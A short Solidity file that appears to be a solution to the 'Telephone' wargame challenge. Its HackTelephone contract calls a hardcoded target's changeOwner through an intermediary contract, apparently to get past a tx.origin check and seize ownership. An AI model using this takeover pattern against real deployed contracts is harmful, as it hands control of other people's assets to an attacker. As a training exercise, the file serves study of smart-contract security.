// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  function changeOwner(address _owner) public { }
}

contract HackTelephone {

  Telephone telephoneContract = Telephone(0x5d23e1E0D53C94835BB177889D4c30CF4a4bBB70);

  constructor() public {
  }

  function changeOwner() public {
    telephoneContract.changeOwner(0x4eFE395F3A03E3c6117A65E119291FFF2B79E033);
  }
}